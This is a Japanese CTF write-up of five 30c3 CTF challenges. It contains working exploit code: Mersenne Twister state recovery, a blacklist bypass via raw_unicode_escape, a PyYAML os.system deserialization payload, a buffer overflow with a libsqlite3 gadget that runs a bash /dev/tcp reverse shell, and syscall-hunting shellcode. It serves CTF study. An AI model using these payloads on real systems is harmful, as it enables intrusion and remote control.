---
date: '2014-01-29T14:04:07+09:00'
title: 30c3 ctf writeup
categories:
 - CTF
 - writeup
tags:
 - C3CTF
#thumbnailImage: //example.com/image.jpg
---

2013/12/28-30 の30c3 ctfにチーム0x0として参加しました。

[2100点で19位でした。](https://archive.aachen.ccc.de/30c3ctf.aachen.ccc.de/scoreboard/)

<!--more-->

## 自分が解いた問題
### guess

    #!/usr/bin/python
     
    """
    static PyObject *
    random_getrandbits(RandomObject *self, PyObject *args)
    {
        (前略)
     
        /* Fill-out whole words, byte-by-byte to avoid endianness issues */
        for (i=0 ; i<bytes ; i+=4, k-=32) {
            r = genrand_int32(self);
            if (k < 32)
                r >>= (32 - k);
            bytearray[i+0] = (unsigned char)r;
            bytearray[i+1] = (unsigned char)(r >> 8);
            bytearray[i+2] = (unsigned char)(r >> 16);
            bytearray[i+3] = (unsigned char)(r >> 24);
        }
     
        (後略)
    }
     
    サーバーから送られてくる32bit * 2個の乱数(r.getrandbits(64))を10回当てるとflagが
    送られてくる。
     
    Pythonのrandomモジュールはメルセンヌ・ツイスタで乱数を生成している。
    624 / 2回乱数を受信して状態ベクトルを再現することによって、次の乱数を予測できる。
    """
     
    import socket
    import random
    import re
     
    def untemper(rand):
        rand ^= rand >> 18;
        rand ^= (rand << 15) & 0xefc60000;
     
        a = rand ^ ((rand << 7) & 0x9d2c5680);
        b = rand ^ ((a << 7) & 0x9d2c5680);
        c = rand ^ ((b << 7) & 0x9d2c5680);
        d = rand ^ ((c << 7) & 0x9d2c5680);
        rand = rand ^ ((d << 7) & 0x9d2c5680);
     
        rand ^= ((rand ^ (rand >> 11)) >> 11);
        return rand
     
    r = random.Random()
    s = socket.create_connection(("88.198.89.194", 8888))
    N = 624
    print s.recv(4096)
    state = []
    for i in range(N / 2):
        print s.recv(4096)
        s.sendall("0\n")
        answerline = s.recv(4096)
        m = re.match(r"Nope, that was wrong, correct would have been (\d+)...\n",
                answerline)
        answer = int(m.group(1))
        print answer
        state.append(untemper(answer & 0xffffffff))
        state.append(untemper(answer >> 32))
     
    state.append(N) #new index
     
    r.setstate([3, tuple(state), None])
     
    for i in range(10):
        print s.recv(4096)
        s.sendall(str(r.getrandbits(64)) + "\n")
        print s.recv(4096)

### pyexec

    #!/usr/bin/python
    """
     
    サーバーにコードを送ると、↓のコードで入力をチェックした後、
    pythonインタプリタで実行される。
    --------------------------------------------------------------------------------
    blacklist = [
        'UnicodeDecodeError', 'intern', 'FloatingPointError', 'UserWarning',
        'PendingDeprecationWarning', 'any', 'EOFError', 'next', 'AttributeError',
        'ArithmeticError', 'UnicodeEncodeError', 'get_ipython', 'import', 'bin', 'map',
        'bytearray', '__name__', 'SystemError', 'set', 'NameError', 'Exception',
        'ImportError', 'basestring', 'GeneratorExit', 'float', 'BaseException',
        'IOError', 'id', 'hex', 'input', 'reversed', 'RuntimeWarning', '__package__',
        'del', 'yield', 'ReferenceError', 'chr', '__doc__', 'setattr',
        'KeyboardInterrupt', '__IPYTHON__', '__debug__', 'from', 'IndexError',
        'coerce', 'False', 'eval', 'repr', 'LookupError', 'file', 'MemoryError',
        'None', 'SyntaxWarning', 'max', 'list', 'pow', 'callable', 'len',
        'NotImplementedError', 'BufferError', '__import__', 'FutureWarning', 'buffer',
        'def', 'unichr', 'vars', 'globals', 'xrange', 'ImportWarning', 'dreload',
        'issubclass', 'exec', 'UnicodeError', 'raw_input', 'isinstance', 'finally',
        'Ellipsis', 'DeprecationWarning', 'return', 'OSError', 'complex', 'locals',
        'format', 'super', 'ValueError', 'reload', 'round', 'object', 'StopIteration',
        'ZeroDivisionError', 'memoryview', 'enumerate', 'slice', 'delattr',
        'AssertionError', 'EnvironmentError', 'property', 'zip', 'apply', 'long',
        'except', 'lambda', 'filter', 'assert', 'copyright', 'bool', 'BytesWarning',
        'getattr', 'dict', 'type', 'oct', '__IPYTHON__active', 'NotImplemented',
        'iter', 'hasattr', 'UnicodeTranslateError', 'bytes', 'abs', 'credits', 'min',
        'TypeError', 'execfile', 'SyntaxError', 'classmethod', 'cmp', 'tuple',
        'compile', 'try', 'all', 'open', 'divmod', 'staticmethod', 'license', 'raise',
        'Warning', 'frozenset', 'global', 'StandardError', 'IndentationError',
        'reduce', 'range', 'hash', 'KeyError', 'help', 'SystemExit', 'dir', 'ord',
        'True', 'UnboundLocalError', 'UnicodeWarning', 'TabError', 'RuntimeError',
        'sorted', 'sum', 'class', 'OverflowError'
    ]
    for entry in blacklist:
        if entry in data:
            return False
     
    whitelist = re.compile("^[\r\na-z0-9#\t,+*/:%><= _\\\-]*$", re.DOTALL)
    return bool(whitelist.match(data))
    --------------------------------------------------------------------------------
     
    raw_unicode_escape エンコーディングを使うと\uXXXX 形式でコードを書くことができる
    ので、 チェックを回避して任意のコードを実行できる。
     
    raw_unicode_escapeしたリバースシェルを突っ込んで終了
    """
    import sys
    f = open("input.py", "r")
    print "# coding: raw_unicode_escape"
    for c in f.read():
        sys.stdout.write("\u%04x" % ord(c))

### yass

    """
    --------------------------------------------------------------------------------
    $ ./yass
    yass online
    /bin/ls test
    /bin/ls: test にアクセスできません: そのようなファイルやディレクトリはありません
    --------------------------------------------------------------------------------
     
    コマンドを実行する時、snprintf(buf, size, '{"cmd":"%s", "args":"%s"}', コマンド, 引数)
    でYAMLを組み立て、modules/filter.pycに渡してチェックしている。
     
    --------------------------------------------------------------------------------
    """
    # 2013.12.28 11:59:16 JST
    #Embedded file name: /home/user/modules/filter.py
    import yaml
    import string
     
    class Filter:
     
        def __init__(self):
            self.allowed_commands = ['/bin/ls', '/usr/bin/whoami', '/usr/bin/uname']
            self.goodchars = string.lowercase + string.uppercase + string.digits + '/ *.?'
            self.payload = dict()
     
        def get_command(self, yamlstring):
            try:
                self.payload = yaml.load(yamlstring)
            except:
                self.payload = dict()
                return self.payload
     
            if self.payload['cmd'] not in self.allowed_commands:
                self.payload['errcmd'] = 'Blacklisted command %s' % self.payload['cmd']
                self.payload['cmd'] = '/bin/false'
            for c in self.payload['args']:
                if c not in self.goodchars:
                    self.payload['args'] = ''
                    self.payload['errarg'] = 'Found at least one blacklisted char!'
                    break
     
            return self.payload
    +++ okay decompyling modules/filter.pyc 
    # decompiled 1 files: 1 okay, 0 failed, 0 verify failed
    # 2013.12.28 11:59:16 JST
     
    """
    --------------------------------------------------------------------------------
     
    yaml.loadは任意の関数を実行できるので、
    --------------------------------------------------------------------------------
    >>> import yaml
    >>> yaml.load('!!python/object/apply:os.system ["/bin/sh"]')
    $ 
    --------------------------------------------------------------------------------
     
    /bin/ls ","cmd":!!python/object/apply:os.system ["/bin/sh"],"args":"
    を突っ込むとシェルが起動する
    """

### DOGE2

    #!/usr/bin/python
    """
    DOGE2の説明に必要なので、DOGE1の解説も書いておきます。
     
    DOGE1: 
    犬の名前読み込む処理にバッファがオーバーフローするバグがある。
    犬の名前の次に、犬の絵のパス(ascii_art_doge_color.txt\0)が格納されている。
    そこで、それを上書きすることで、任意のファイルを表示できる。
    /etc/passwdにflag。
     
    --------------------------------------------------------------------------------
    __pyx_v_4doge_namebuf:
     20b220 446f6765 00000000 00000000 00000000  Doge............
     20b230 00000000 00000000 00000000 00000000  ................
    __pyx_k_39:
     20b240 61736369 695f6172 745f646f 67655f63  ascii_art_doge_c
     20b250 6f6c6f72 2e747874 00737563 68207461  olor.txt.such ta
    --------------------------------------------------------------------------------
     
    --------------------------------------------------------------------------------
    (犬の名前を読み込む処理)
        4d19:   48 8d 35 00 65 20 00    lea    rsi,[rip+0x206500]        # 20b220 <__pyx_v_4doge_namebuf>
        4d20:   89 df                   mov    edi,ebx
        4d22:   ba 00 10 00 00          mov    edx,0x1000  #<- !! バッファは32byteだけど4096byte読んでる
        4d27:   30 c0                   xor    al,al
        4d29:   e8 b2 e0 ff ff          call   2de0 <__read@plt>
    --------------------------------------------------------------------------------
     
    exploit:
    echo -n '12345678901234567890123456789012/etc/passwd\x00' | nc 88.198.89.218 1024
     
    DOGE2:
     
    犬の絵のパスのさらに後を上書きすると、read()呼び出しの後のPyObject_Callでクラッシ
    ュする。
    --------------------------------------------------------------------------------
    python -c "import sys;sys.stdout.write('A'*4096)" | nc localhost 1024
    --------------------------------------------------------------------------------
    --------------------------------------------------------------------------------
    Program received signal SIGSEGV, Segmentation fault.
    [Switching to Thread 0x7ffff7fc4740 (LWP 27554)]
    0x00000000004abf6d in PyObject_Call ()
    (gdb) disas
    Dump of assembler code for function PyObject_Call:
       0x00000000004abf60 <+0>:   push   rbp
       0x00000000004abf61 <+1>:   mov    rbp,rdi
       0x00000000004abf64 <+4>:   push   rbx
       0x00000000004abf65 <+5>:   sub    rsp,0x18
       0x00000000004abf69 <+9>:   mov    rax,QWORD PTR [rdi+0x8]      <- !!
    => 0x00000000004abf6d <+13>:   mov    rbx,QWORD PTR [rax+0x80] <- !!
       0x00000000004abf74 <+20>:  test   rbx,rbx
       0x00000000004abf77 <+23>:  je     0x4abfdc <PyObject_Call+124>
       0x00000000004abf79 <+25>:  mov    rcx,QWORD PTR [rip+0x401760]        # 0x8ad6e0 <_PyThreadState_Current>
       0x00000000004abf80 <+32>:  mov    edi,DWORD PTR [rcx+0x18]
       0x00000000004abf83 <+35>:  add    edi,0x1
       0x00000000004abf86 <+38>:  cmp    edi,DWORD PTR [rip+0x39f244]        # 0x84b1d0 <_Py_CheckRecursionLimit>
       0x00000000004abf8c <+44>:  mov    DWORD PTR [rcx+0x18],edi
       0x00000000004abf8f <+47>:  jg     0x4abfb8 <PyObject_Call+88>
       0x00000000004abf91 <+49>:  mov    rdi,rbp
       0x00000000004abf94 <+52>:  call   rbx      <- !!!!!!!!
     
    (gdb) p/x $rax
    $2 = 0x4141414141414141     <-'AAAAAAAA'
    (gdb) x/x $rdi
    0x7ffff6b18630 <__pyx_type_4doge_Doge>:   0x41414141
    (gdb) p/d $rdi - (unsigned long long)__pyx_v_4doge_namebuf 
    $7 = 1040
    --------------------------------------------------------------------------------
     
    入力によってcall先とrdi(第一引数), raxの指すデータを制御できることが分かる。
     
    第一引数(rdi)の指すデータの8byte後に(呼び出す関数のポインタへのアドレス - 0x80)を
    格納する必要 があるため、 第一引数の文字列に使える領域が実質8byteしかない。
    したがって、直接system()をcallしてリバースシェルを起動することはできない。
    .data領域は実行不可なので、 メモリ上の実行可能な領域から使えそうなコード片を探し出
    し、第一引数を変更した後system()を呼んでもらうことにした。
     
    libsqlite3.so.0.8.6にちょうどいいコードがあるのでこれを使う。 (探すのが大変だった)
       328cc:       48 8b 1f                mov    rbx,QWORD PTR [rdi]          <-!!
       328cf:       4c 8b 8d 48 02 00 00    mov    r9,QWORD PTR [rbp+0x248]
       328d6:       48 03 43 20             add    rax,QWORD PTR [rbx+0x20]
       328da:       48 8b bb 88 01 00 00    mov    rdi,QWORD PTR [rbx+0x188]    <-!!
       328e1:       4c 8b 38                mov    r15,QWORD PTR [rax]
       328e4:       4d 89 f8                mov    r8,r15
       328e7:       ff 93 80 01 00 00       call   QWORD PTR [rbx+0x180]        <-!!
     
    リモートの環境では、
    ・ライブラリや実行ファイルのロードされる位置 (ASLR)
    ・ライブラリ内の関数のオフセット
    が違うので、 DOGE1の脆弱性でリモートから
    ・メモリマップ (/proc/self/maps)
    ・ライブラリ
    　・/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
    　・/lib/x86_64-linux-gnu/libc-2.17.so
    を取得し、バッファと呼び出す関数のアドレスを調整する。
     
    あとはexploitを打ち込むだけ
     
    exploit:
    """
    import sys
    import struct
    BASE = 0x7fc247b12000
    BUF = BASE + 0x20b220
    LIBC_BASE = 0x7fc248e7f000
    SYSTEM = LIBC_BASE + 0x46320
    OBJECT = BUF + 1040
    COMMAND = "bash -c \"bash -p >& /dev/tcp/**/43210 0>&1\"\0"
     
    #/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
    SQLITE_BASE = 0x7fc246bed000
    GADGET = SQLITE_BASE + 0x328cc
    """
       328cc:       48 8b 1f                mov    rbx,QWORD PTR [rdi]
       328cf:       4c 8b 8d 48 02 00 00    mov    r9,QWORD PTR [rbp+0x248]
       328d6:       48 03 43 20             add    rax,QWORD PTR [rbx+0x20]
       328da:       48 8b bb 88 01 00 00    mov    rdi,QWORD PTR [rbx+0x188]
       328e1:       4c 8b 38                mov    r15,QWORD PTR [rax]
       328e4:       4d 89 f8                mov    r8,r15
       328e7:       ff 93 80 01 00 00       call   QWORD PTR [rbx+0x180]
    """
     
    OBJECT = BUF + 1040
     
    buf = ""
    buf += "A" * (1040)
    buf += struct.pack("<Q", OBJECT + 24)                     #OBJECT GADGETのrbx
    buf += struct.pack("<Q", OBJECT + 16 - 0x80)              #OBJECT + 8
    buf += struct.pack("<Q", GADGET)                          #OBJECT + 16
    buf += "\0" * 0x180                                       #OBJECT + 24 GADGETのrbx
    buf += struct.pack("<Q", SYSTEM)                          #GADGETのrbx + 0x180 呼び出す関数へのポインタ
    buf += struct.pack("<Q", BUF + len(buf) + 8)              #GADGETのrbx + 0x188 第一引数へのポインタ
    buf += COMMAND                                            #第一引数
     
    if len(buf) > 4096:
       sys.stderr.write("error\n")
     
    sys.stdout.write(buf)

\

\

### int80

    /*
    標準入力へシェルコードを入力すると、
    ・シェルコード中のint 0x80 (cd 80)、sysenter(0f 34)、 syscall(0f 05)を潰す
    ・リターンアドレスをクリア
    ・汎用レジスタをクリア
    ・スタックの使用されている領域をクリアしてバックトレースを読めないようにする
    の後、シェルコードが実行される。
     
    その上
    ・シェルコードへの書きこみ不可
    ・ASLRが有効
    なので、一見システムコールの呼び出しは不可能に見える。
     
    しかし、スタック上側の使用されていない領域にfread()内部へのポインタが残っている
    ので、 それを利用してlibc内部のsyscall命令を探すことができる。
     
    shellcode:
    */
    .intel_syntax noprefix
    .code64
     
    mov rdi, rsp
     
    //libcを探索
    search_libc:
        mov rax, [rdi]
        mov rbx, rax
     
        //lib or stack
        //0x7f 00 00 00 00 00
        shr rax, 40
        cmp eax, 0x7f
        jnz slnext
     
        //fread の一部
        mov rcx, 0x48000080000045f7
        cmp [rbx], rcx
        jne slnext
     
        mov rdi, rbx
        jmp search_syscall
     
    slnext:
        sub rdi, 8
        jmp search_libc
     
    //syscall (0f 05)を探索
    search_syscall:
        mov ah, 0x05
        mov al, 0x0f
        cmp [rdi], ax
        je exec
        dec rdi
        jmp search_syscall
     
    //cat /home/user/flag
    exec:
        mov r8, rdi
        xor rdx, rdx
        lea rdi, [rip + filename]
        push 0
        lea rax, [rip + arg]
        push rax
        push rdi
        mov rsi, rsp
        mov rax, 0x3b
        jmp r8
     
    filename: .ascii "/bin/cat\0"
    arg: .ascii "/home/user/flag\0"
